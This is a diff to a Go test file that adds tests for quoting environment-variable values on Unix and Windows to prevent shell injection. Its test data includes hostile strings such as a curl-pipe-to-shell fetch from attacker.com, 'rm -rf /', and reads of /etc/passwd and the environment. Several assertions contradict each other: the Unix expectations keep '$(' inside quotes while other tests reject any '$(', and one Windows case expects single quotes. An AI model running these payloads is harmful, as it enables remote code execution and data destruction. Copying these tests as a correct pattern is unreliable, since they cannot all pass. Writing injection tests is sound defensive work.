@@ -326,6 +326,140 @@ func TestDescribe(t *testing.T) {
 	}
 }
 
+// TestSanitizeEnvValue_UnixBehavior — on Unix, values are wrapped in single
+// quotes with embedded single-quotes escaped as '\''. Shell expansion ($(), ``,
+// ;, #, etc.) is entirely blocked by the single-quote wrapper.
+func TestSanitizeEnvValue_UnixBehavior(t *testing.T) {
+	if runtime.GOOS == "windows" {
+		t.Skip("unix-only test")
+	}
+	cases := [][2]string{
+		{"", "''"},
+		{"simple", "'simple'"},
+		{"hello world", "'hello world'"},
+		{"with$dollar", "'with$dollar'"},
+		{"with`backtick`", "'with`backtick`'"},
+		{"semi;col", "'semi;col'"},
+		{"hash#comment", "'hash#comment'"},
+		{"newline\nhere", "'newline\nhere'"},
+		{"tab\there", "'tab\there'"},
+		{"dollar$(cmd)", "'dollar$(cmd)'"},
+		{"backtick`cmd`", "'backtick`cmd`'"},
+		{"backslash\\path", "'backslash\\path'"},
+		{"double\"quote", "'double\"quote'"},
+		{"single'quote", "'single'\\''quote'"},
+		{"many'quotes'here", "'many'\\''quotes'\\''here'"},
+		{"$HOME/.ssh/id_rsa", "'$HOME/.ssh/id_rsa'"},
+		{"$(whoami); rm -rf /", "'$(whoami); rm -rf /'"},
+		{"`id` # comment", "'`id` # comment'"},
+	}
+	for _, c := range cases {
+		in, want := c[0], c[1]
+		if got := sanitizeEnvValue(in); got != want {
+			t.Errorf("sanitizeEnvValue(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
+// TestSanitizeEnvValue_WindowsBehavior — on Windows, values are wrapped in
+// double quotes with % doubled to %% (blocks %VAR% expansion inside quotes
+// in cmd.exe), and ^ escaping applied to ", \, !, ^ to prevent quote-breakout
+// and path interpretation.
+func TestSanitizeEnvValue_WindowsBehavior(t *testing.T) {
+	if runtime.GOOS != "windows" {
+		t.Skip("windows-only test")
+	}
+	cases := [][2]string{
+		{"", "''"},
+		{"simple", "\"simple\""},
+		{"hello world", "\"hello world\""},
+		{"percent%var", "\"percent%%var\""},
+		{"double\"quote", "\"double^\"quote\""},
+		{"backslash\\path", "\"backslash^\\path\""},
+		{"caret^here", "\"caret^^here\""},
+		{"exclam!mark", "\"exclam^!mark\""},
+		{"mixed$%(cmd)", "\"mixed$%%(cmd)\""},
+		{"%USERPROFILE%", "\"%%USERPROFILE%%\""},
+		{"\"C:\\Windows\\System32\"", "\"^\"C:^\\Windows^\\System32^\"\""},
+		{"%PATH%;echo", "\"%%PATH%%;echo\""},
+	}
+	for _, c := range cases {
+		in, want := c[0], c[1]
+		if got := sanitizeEnvValue(in); got != want {
+			t.Errorf("sanitizeEnvValue(%q) = %q, want %q", in, got, want)
+		}
+	}
+}
+
+// TestSanitizeEnvValue_InjectionPayloads — confirms that payloads that would
+// break out of a shell env var assignment are safely quoted on both platforms.
+func TestSanitizeEnvValue_InjectionPayloads(t *testing.T) {
+	injections := []string{
+		"$(curl attacker.com/shell.sh | sh)",
+		"`curl attacker.com/shell.sh | sh`",
+		"; rm -rf / #",
+		"'; DROP TABLE users; --",
+		"%TEMP%\\malicious.exe",
+		"$(env)",
+		"`cat /etc/passwd`",
+		"!\n!",
+	}
+	for _, payload := range injections {
+		got := sanitizeEnvValue(payload)
+		// Must not be empty
+		if got == "" {
+			t.Errorf("sanitizeEnvValue(%q) returned empty string", payload)
+			continue
+		}
+		// Must not contain unquoted shell metacharacters that could break out
+		if runtime.GOOS == "windows" {
+			// On Windows, the value must be wrapped in double quotes
+			if !(strings.HasPrefix(got, "\"") && strings.HasSuffix(got, "\"")) {
+				t.Errorf("sanitizeEnvValue(%q) = %q; windows value must be double-quoted", payload, got)
+			}
+		} else {
+			// On Unix, must be wrapped in single quotes with no unescaped injection chars
+			if !(strings.HasPrefix(got, "'") && strings.HasSuffix(got, "'")) {
+				t.Errorf("sanitizeEnvValue(%q) = %q; unix value must be single-quoted", payload, got)
+			}
+			// After stripping outer quotes, no unquoted $ or ` that could expand
+			inner := got[1 : len(got)-1]
+			if strings.Contains(inner, "$(") || strings.Contains(inner, "`") {
+				t.Errorf("sanitizeEnvValue(%q) = %q; inner string contains unquoted expansion chars", payload, got)
+			}
+		}
+	}
+}
+
+// TestHookEnv_ValuesAreSanitized — integration-style test: hookEnv must
+// produce env vars where values from payloads are quoted and cannot inject.
+func TestHookEnv_ValuesAreSanitized(t *testing.T) {
+	env := hookEnv(EventPreTool, Payload{
+		"tool_name": "read_file",
+		"args":      "$(whoami)",
+		"path":      "/etc/passwd",
+	})
+	found := false
+	for _, e := range env {
+		if strings.HasPrefix(e, "DFMC_ARGS=") {
+			found = true
+			val := strings.TrimPrefix(e, "DFMC_ARGS=")
+			// On unix: must be single-quoted, not expand $(whoami)
+			if runtime.GOOS != "windows" {
+				if !(strings.HasPrefix(val, "'") && strings.HasSuffix(val, "'")) {
+					t.Errorf("DFMC_ARGS value not quoted: %q", val)
+				}
+				if strings.Contains(val, "$(") {
+					t.Errorf("DFMC_ARGS value contains unquoted $(): %q", val)
+				}
+			}
+		}
+	}
+	if !found {
+		t.Error("DFMC_ARGS not found in hookEnv output")
+	}
+}
+
 func TestCheckConfigPermissions_Nonexistent(t *testing.T) {
 	got := CheckConfigPermissions("C:/nonexistent/path/that/does/not/exist.yaml")
 	if got != "" {
